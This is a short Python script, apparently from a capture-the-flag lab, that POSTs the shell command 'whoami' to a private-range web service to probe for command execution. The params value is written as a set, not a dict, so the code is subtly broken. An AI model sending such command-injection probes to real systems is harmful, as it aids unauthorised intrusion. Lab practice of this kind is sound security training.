import requests

headers = { "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" }
url = "http://10.10.10.168:8080/"
s = requests.session()
params = { "whoami" }
response = s.post(url,data=params,headers=headers)
print (response.text)
print (response.status_code)
